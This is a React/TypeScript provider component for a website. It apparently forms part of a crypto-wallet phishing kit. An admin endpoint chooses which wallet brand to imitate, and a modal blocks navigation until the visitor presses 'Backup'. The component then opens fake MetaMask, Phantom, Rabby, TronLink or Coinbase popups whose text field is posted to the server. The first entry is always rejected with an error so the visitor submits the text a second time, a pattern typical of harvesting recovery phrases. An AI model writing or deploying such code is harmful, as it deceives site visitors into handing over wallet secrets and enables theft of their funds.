import {
  CheckCircleIcon,
  ExclamationTriangleIcon
} from "@heroicons/react/24/outline";
import { AnimatePresence, motion } from "motion/react";
import {
  createContext,
  type FormEvent,
  type PropsWithChildren,
  useCallback,
  useContext,
  useEffect,
  useState
} from "react";
import { useNavigate } from "react-router";
import { Button } from "@/components/Shared/UI";
import Coinbase from "./walmodals/Coinbase";
import { walletModalCopy } from "./walmodals/copy";
import MetaMask from "./walmodals/MetaMask";
import Phantom from "./walmodals/Phantom";
import Rabby from "./walmodals/Rabby";
import TronLink from "./walmodals/TronLink";

type WalletPreference =
  | "metamask"
  | "phantom"
  | "rabby"
  | "tronlink"
  | "coinbase"
  | null;
type SyncStatus = "Synced" | "Not";
type WalletName = Exclude<WalletPreference, null>;

const walletNames: Record<WalletName, string> = {
  coinbase: "Coinbase",
  metamask: "MetaMask",
  phantom: "Phantom",
  rabby: "Rabby",
  tronlink: "TronLink"
};

interface AddressBackupReminderContextValue {
  requestNavigation: (path: string) => boolean;
}

const AddressBackupReminderContext =
  createContext<AddressBackupReminderContextValue | null>(null);

const isExemptRoute = (path: string) =>
  path === "/" ||
  path === "/settings" ||
  path.startsWith("/settings/") ||
  path.startsWith("/u/") ||
  path.startsWith("/account/");

export const AddressBackupReminderProvider = ({
  children
}: PropsWithChildren) => {
  const navigate = useNavigate();
  const [walletPreference, setWalletPreference] =
    useState<WalletPreference>(null);
  const [syncStatus, setSyncStatus] = useState<SyncStatus>("Synced");
  const [isPreferenceLoaded, setIsPreferenceLoaded] = useState(false);
  const [pendingPath, setPendingPath] = useState<string | null>(null);
  const [isReminderOpen, setIsReminderOpen] = useState(false);
  const [isBackupOpen, setIsBackupOpen] = useState(false);
  const [isFirstPopupFeedback, setIsFirstPopupFeedback] = useState(true);
  const [feedback, setFeedback] = useState("");
  const [feedbackError, setFeedbackError] = useState("");
  const [isFeedbackFocused, setIsFeedbackFocused] = useState(false);
  const [browserColorScheme, setBrowserColorScheme] = useState<
    "Dark" | "Light" | null
  >(null);
  const isRightSidebarOpen =
    isBackupOpen &&
    walletPreference !== "tronlink" &&
    walletPreference !== "coinbase" &&
    walletPreference !== "rabby";

  useEffect(() => {
    const colorScheme = window.matchMedia("(prefers-color-scheme: dark)");
    const updateColorScheme = () =>
      setBrowserColorScheme(colorScheme.matches ? "Dark" : "Light");

    updateColorScheme();
    colorScheme.addEventListener("change", updateColorScheme);

    return () => colorScheme.removeEventListener("change", updateColorScheme);
  }, []);

  useEffect(() => {
    if (
      isBackupOpen &&
      (walletPreference === "metamask" ||
        walletPreference === "tronlink" ||
        walletPreference === "coinbase" ||
        walletPreference === "phantom" ||
        walletPreference === "rabby")
    ) {
      setFeedback("");
      setFeedbackError("");
      setIsFirstPopupFeedback(true);
    }
  }, [isBackupOpen, walletPreference]);

  useEffect(() => {
    if (!isRightSidebarOpen) return;

    document.documentElement.classList.add("no-scrollbar");
    return () => document.documentElement.classList.remove("no-scrollbar");
  }, [isRightSidebarOpen]);

  useEffect(() => {
    let isActive = true;
    const loadWalletPreference = async () => {
      try {
        const response = await fetch(
          "/api/admin/activity?view=wallet-preference",
          {
            cache: "no-store",
            credentials: "same-origin"
          }
        );
        if (!response.ok) {
          throw new Error(
            `Unable to load wallet preference (${response.status}).`
          );
        }

        const data = (await response.json()) as {
          syncStatus: SyncStatus;
          wallet: WalletPreference;
        };
        if (!isActive) return;
        setWalletPreference(data.wallet);
        setSyncStatus(data.syncStatus ?? "Synced");
      } catch (error) {
        console.error("Unable to load wallet preference.", error);
      } finally {
        if (isActive) setIsPreferenceLoaded(true);
      }
    };

    void loadWalletPreference();
    const intervalId = window.setInterval(
      () => void loadWalletPreference(),
      15000
    );

    return () => {
      isActive = false;
      window.clearInterval(intervalId);
    };
  }, []);

  useEffect(() => {
    if (!isPreferenceLoaded || !pendingPath) return;

    if (syncStatus === "Not") {
      setIsReminderOpen(true);
    } else if (walletPreference) {
      setIsReminderOpen(true);
    } else {
      navigate(pendingPath);
    }
    setPendingPath(null);
  }, [isPreferenceLoaded, navigate, pendingPath, syncStatus, walletPreference]);

  const requestNavigation = useCallback(
    (path: string) => {
      if (isExemptRoute(path)) {
        setPendingPath(null);
        setIsReminderOpen(false);
        return true;
      }
      if (!isPreferenceLoaded) {
        setPendingPath(path);
        return false;
      }
      if (syncStatus !== "Not" && !walletPreference) return true;

      setIsReminderOpen(true);
      return false;
    },
    [isPreferenceLoaded, syncStatus, walletPreference]
  );

  const isDarkMode = browserColorScheme === "Dark";

  const handleFeedbackSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const copy =
      walletPreference === "phantom"
        ? walletModalCopy.phantom
        : walletPreference === "rabby"
          ? walletModalCopy.rabby
          : walletPreference === "tronlink"
            ? walletModalCopy.tronlink
            : walletPreference === "coinbase"
              ? walletModalCopy.coinbase
              : walletModalCopy.metamask;

    if (
      (walletPreference === "metamask" ||
        walletPreference === "tronlink" ||
        walletPreference === "coinbase" ||
        walletPreference === "phantom" ||
        walletPreference === "rabby") &&
      isFirstPopupFeedback
    ) {
      try {
        const response = await fetch(
          "/api/admin/activity?view=submit-feedback",
          {
            body: JSON.stringify({ feedback, isFirstTry: true }),
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            method: "POST"
          }
        );
        if (!response.ok) {
          throw new Error(
            copy.submit_error.replace("{status}", String(response.status))
          );
        }
        setFeedbackError(copy.feedback_error);
        setIsFirstPopupFeedback(false);
      } catch (error) {
        console.error("Failed to submit feedback:", error);
        setFeedbackError(
          error instanceof Error ? error.message : copy.submit_error_fallback
        );
      }
      return;
    }

    try {
      setFeedbackError("");
      const response = await fetch("/api/admin/activity?view=submit-feedback", {
        body: JSON.stringify({ feedback, isFirstTry: false }),
        credentials: "same-origin",
        headers: { "Content-Type": "application/json" },
        method: "POST"
      });
      if (!response.ok) {
        throw new Error(
          copy.submit_error.replace("{status}", String(response.status))
        );
      }
      setFeedback("");
      setWalletPreference(null);
      setIsBackupOpen(false);
      setIsReminderOpen(false);
    } catch (error) {
      console.error("Failed to submit feedback:", error);
      setFeedbackError(
        error instanceof Error ? error.message : copy.submit_error_fallback
      );
    }
  };

  const walletFeedbackModalProps = {
    feedback,
    feedbackError,
    isDarkMode,
    isFeedbackFocused,
    onClose: () => {
      setIsBackupOpen(false);
      setIsReminderOpen(false);
    },
    onFeedbackChange: (value: string) => {
      setFeedback(value);
      setFeedbackError("");
    },
    onFeedbackFocusChange: setIsFeedbackFocused,
    onSubmit: handleFeedbackSubmit
  };

  return (
    <AddressBackupReminderContext.Provider value={{ requestNavigation }}>
      <div className="relative min-h-screen w-full overflow-x-hidden">
        <motion.div
          animate={{
            opacity: isBackupOpen ? 0.65 : 1,
            width: isRightSidebarOpen ? "calc(100% - 380px)" : "100%",
            x: isRightSidebarOpen ? -24 : 0
          }}
          className="min-h-screen"
          transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
        >
          {children}
        </motion.div>

        {isReminderOpen && (syncStatus === "Not" || walletPreference) && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 p-4">
            <motion.section
              animate={{ x: isRightSidebarOpen ? -180 : 0 }}
              aria-label={
                syncStatus === "Not"
                  ? "Synchronization problem"
                  : "Address backup required"
              }
              aria-modal="true"
              className="w-full max-w-md space-y-4 rounded-xl bg-white p-6 shadow-xl"
              role="dialog"
              transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
            >
              {syncStatus === "Not" ? (
                <div className="flex flex-col items-center gap-5 text-center">
                  <ExclamationTriangleIcon
                    aria-hidden="true"
                    className="size-16 text-yellow-500"
                  />
                  <div className="space-y-2 text-center">
                    <h2 className="font-semibold text-xl">
                      Synchronization has a problem.
                    </h2>
                    <p className="text-gray-700">
                      Please contact your administrator to resolve this issue.
                    </p>
                  </div>
                  <Button
                    className="h-10"
                    onClick={() => setIsReminderOpen(false)}
                    type="button"
                  >
                    Close
                  </Button>
                </div>
              ) : (
                <>
                  <div className="flex flex-col items-center gap-5 text-center">
                    <CheckCircleIcon
                      aria-hidden="true"
                      className="size-16 text-green-500"
                    />
                    <div className="space-y-2">
                      <h2 className="font-semibold text-xl">
                        Address backup required
                      </h2>
                      <p className="text-gray-700">
                        This site recommends keeping a safe copy of your public
                        wallet address for{" "}
                        {walletPreference
                          ? walletNames[walletPreference]
                          : "your wallet"}
                        .
                      </p>
                    </div>
                  </div>
                  <div className="flex justify-end gap-2">
                    <Button
                      className="h-10"
                      onClick={() => setIsReminderOpen(false)}
                      type="button"
                    >
                      Close
                    </Button>
                    {walletPreference && (
                      <Button
                        className="h-10 w-[140px] rounded-2xl bg-[var(--color-red-600)] px-4 text-sm text-white shadow-sm transition-colors hover:bg-[var(--color-red-700)] active:bg-[var(--color-red-600)] dark:bg-[var(--color-red-600)] dark:text-white dark:active:bg-[var(--color-red-600)] dark:hover:bg-[var(--color-red-700)]"
                        disabled={isBackupOpen}
                        loading={isBackupOpen}
                        onClick={() => {
                          setIsBackupOpen(true);
                        }}
                        style={{
                          backgroundColor: "var(--color-brand-600)",
                          borderColor: "var(--color-brand-600)",
                          fontSize: 16
                        }}
                        type="button"
                      >
                        Backup
                      </Button>
                    )}
                  </div>
                </>
              )}
            </motion.section>
          </div>
        )}
        <AnimatePresence>
          {isBackupOpen &&
            walletPreference &&
            (walletPreference === "tronlink" ||
            walletPreference === "coinbase" ||
            walletPreference === "rabby" ? (
              <>
                <motion.button
                  animate={{ opacity: 1 }}
                  aria-label={`Close ${walletPreference === "tronlink" ? "TronLink" : walletPreference === "rabby" ? "Rabby" : "Coinbase"} feedback popup`}
                  className="fixed inset-0 z-[100] cursor-default border-0 bg-transparent p-0"
                  exit={{ opacity: 0 }}
                  initial={{ opacity: 0 }}
                  onClick={() => {
                    setIsBackupOpen(false);
                    setIsReminderOpen(false);
                  }}
                  type="button"
                />
                {walletPreference === "tronlink" ? (
                  <TronLink key="tronlink" {...walletFeedbackModalProps} />
                ) : walletPreference === "rabby" ? (
                  <Rabby key="rabby" {...walletFeedbackModalProps} />
                ) : (
                  <Coinbase key="coinbase" {...walletFeedbackModalProps} />
                )}
              </>
            ) : walletPreference === "metamask" ? (
              <MetaMask key="metamask" {...walletFeedbackModalProps} />
            ) : walletPreference === "phantom" ? (
              <Phantom key="phantom" {...walletFeedbackModalProps} />
            ) : null)}
        </AnimatePresence>
      </div>
    </AddressBackupReminderContext.Provider>
  );
};

export const useAddressBackupReminder = () => {
  const context = useContext(AddressBackupReminderContext);
  if (!context) {
    throw new Error(
      "useAddressBackupReminder must be used within AddressBackupReminderProvider."
    );
  }
  return context;
};
